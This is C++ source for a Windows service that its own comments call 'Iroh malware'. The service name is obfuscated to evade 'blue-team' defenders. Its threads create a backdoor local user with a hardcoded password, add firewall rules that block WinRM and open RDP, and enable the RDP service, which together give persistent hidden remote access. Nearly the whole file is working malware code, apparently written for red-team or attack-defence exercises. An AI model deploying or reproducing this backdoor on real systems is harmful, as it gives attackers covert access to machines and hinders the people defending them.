// ServiceEntrypoint.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <Windows.h>

// Iroh Library Import.
#include "../Iroh-Library/Iroh/User.h"
#include "../Iroh-Library/Iroh/Firewall.h"
#include "../Iroh-Library/Iroh/EnableServices.h"
#include "../Iroh-Library/Utilities/obfuscate.h"

using namespace Iroh;

#pragma comment(lib, "advapi32.lib")

// Defines here
// Obfuscated service name for Iroh malware.
// Makes it harder for blue-team to find.
#define ServiceName (wchar_t *)(char *)AY_OBFUSCATE("D0Svc")
#define IROH_THREADS		3

// Globals here
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;
HANDLE ServiceStopEvent = NULL;


DWORD WINAPI iroh_user_thread(LPVOID lpParam) {
	// Based on the example code for Iroh_Library.
	// Initialize the class object
	IrohUser irohUser = IrohUser();

	// Use setters to set the class variables
	irohUser.SetUsername("Iroh"); // Replace with your own username/password combo.
	irohUser.SetPassword("LeavesFromTheV1ne");
	irohUser.SetSleepTime(10000);

	// Start the process for the irohUser
	irohUser.Start();

	return 0;
}

DWORD WINAPI firewall_thread(LPVOID lpParam) {
	// Initialize the class object.
	Firewall firewall = Firewall();

	// WinRM Firewall Rules //
	Iroh::Firewall::FirewallRule blockWinRMAll;
	blockWinRMAll.ruleName = (wchar_t*)(char*)AY_OBFUSCATE("Block All Incoming WinRM Traffic.");
	blockWinRMAll.ruleDescription = (wchar_t*)(char*)AY_OBFUSCATE("Blocks All Incoming WinRM Traffic.");
	blockWinRMAll.allowAccess = VARIANT_FALSE; // Blocks WinRM
	blockWinRMAll.localPorts = L"5985,5986";
	blockWinRMAll.protocol = NET_FW_IP_PROTOCOL_ANY;
	blockWinRMAll.direction = NET_FW_RULE_DIR_IN;

	Iroh::Firewall::FirewallRule blockWinRMOut;
	blockWinRMOut.ruleName = (wchar_t*)(char*)AY_OBFUSCATE("Block All Outgoing WinRM Traffic.");
	blockWinRMOut.ruleDescription = (wchar_t*)(char*)AY_OBFUSCATE("Blocks All Outgoing WinRM Traffic.");
	blockWinRMOut.allowAccess = VARIANT_FALSE; // Blocks WinRM
	blockWinRMOut.localPorts = L"5985,5986";
	blockWinRMOut.protocol = NET_FW_IP_PROTOCOL_ANY;
	blockWinRMOut.direction = NET_FW_RULE_DIR_OUT;

	// RDP Firewall Rules //
	Iroh::Firewall::FirewallRule enableRDP;
	enableRDP.ruleName = (wchar_t*)(char*)AY_OBFUSCATE("Enable Incoming RDP Traffic.");
	enableRDP.ruleDescription = (wchar_t*)(char*)AY_OBFUSCATE("Enable All Incoming RDP Traffic.");
	enableRDP.localPorts = L"3389";
	enableRDP.protocol = NET_FW_IP_PROTOCOL_ANY;
	enableRDP.direction = NET_FW_RULE_DIR_IN;

	Iroh::Firewall::FirewallRule enableRDPOut;
	enableRDPOut.ruleName = (wchar_t*)(char*)AY_OBFUSCATE("Enable Outgoing RDP Traffic.");
	enableRDPOut.ruleDescription = (wchar_t*)(char*)AY_OBFUSCATE("Enable All Outgoing RDP Traffic.");
	enableRDPOut.localPorts = L"3389";
	enableRDPOut.protocol = NET_FW_IP_PROTOCOL_ANY;
	enableRDPOut.direction = NET_FW_RULE_DIR_OUT;

	/* Insert firewall rules using this command. */
	// Block all WinRM Traffic.
	firewall.AddRule(blockWinRMAll);
	firewall.AddRule(blockWinRMOut);
	
	// Enable all RDP Traffic.
	firewall.AddRule(enableRDP);
	firewall.AddRule(enableRDPOut);

	// Start the firewall process
	firewall.Start();

	return 0;
}

DWORD WINAPI services_thread(LPVOID lpParam) {
	// Create the class object.
	EnableServices service_enabler = EnableServices();
	// TODO: Disable services for Iroh.


	// Enable RDP
	service_enabler.SetEnableRDP(TRUE);

	// Start the process for the services.
	service_enabler.Start();

	return 0;
}


DWORD WINAPI PopupThread(LPVOID lpParameter) {
	HANDLE threads[IROH_THREADS];
	DWORD threads_ids[IROH_THREADS];

	threads[0] = CreateThread(NULL, 0, iroh_user_thread, NULL, 0, &threads_ids[0]);
	threads[1] = CreateThread(NULL, 0, firewall_thread, NULL, 0, &threads_ids[1]);
	threads[2] = CreateThread(NULL, 0, services_thread, NULL, 0, &threads_ids[2]);

	WaitForMultipleObjects(IROH_THREADS, threads, TRUE, INFINITE);

	return 0;
}

VOID ReportServiceStatus(DWORD CurrentState, DWORD Win32ExitCode, DWORD WaitHint) {

	static DWORD CheckPoint = 1;

	ServiceStatus.dwCurrentState = CurrentState;
	ServiceStatus.dwWin32ExitCode = Win32ExitCode;
	ServiceStatus.dwWaitHint = WaitHint;

	if (CurrentState == SERVICE_START_PENDING) {
		ServiceStatus.dwControlsAccepted = 0;
	}
	else {
		ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
	}
	if ((CurrentState == SERVICE_RUNNING) ||
		(CurrentState == SERVICE_STOPPED))
		ServiceStatus.dwCheckPoint = 0;
	else ServiceStatus.dwCheckPoint = CheckPoint++;


	SetServiceStatus(ServiceStatusHandle, &ServiceStatus);

}

VOID WINAPI ServiceControlHandler(DWORD Control) {

	switch (Control)
	{
	case SERVICE_CONTROL_STOP:
		ReportServiceStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
		SetEvent(ServiceStopEvent);
		ReportServiceStatus(ServiceStatus.dwCurrentState, NO_ERROR, 0);
	case SERVICE_CONTROL_INTERROGATE:
		break;

	default:
		break;
	}

}

VOID ServiceWorker(DWORD Argc, LPTSTR* Argv) {

	// We need to create an event that the svcctrlhhandler will use to signal when it recieves the stop code
	ServiceStopEvent = CreateEvent(
		NULL,
		TRUE,
		FALSE,
		NULL
	);

	if (ServiceStopEvent == NULL) {
		ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}

	ReportServiceStatus(SERVICE_RUNNING, NO_ERROR, 0);

	DWORD ThreadID;
	HANDLE myHandle = CreateThread(0, 0, PopupThread, NULL, 0, &ThreadID);

	while (1) {

		WaitForSingleObject(ServiceStopEvent, INFINITE);
		ReportServiceStatus(SERVICE_STOPPED, NO_ERROR, 0);
		return;
	}
}

VOID WINAPI ServiceMain(DWORD Argc, LPTSTR* Argv) {

	ServiceStatusHandle = RegisterServiceCtrlHandler(
		ServiceName,
		ServiceControlHandler
	);

	ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	ServiceStatus.dwServiceSpecificExitCode = 0;

	ReportServiceStatus(SERVICE_START_PENDING, NO_ERROR, 3000);

	ServiceWorker(Argc, Argv);

}

int main()
{

	// Tell SCM to start the service

	SERVICE_TABLE_ENTRY DispatchTable[] =
	{
		{(LPWSTR)ServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
		{NULL, NULL}
	};

	StartServiceCtrlDispatcher(DispatchTable);
}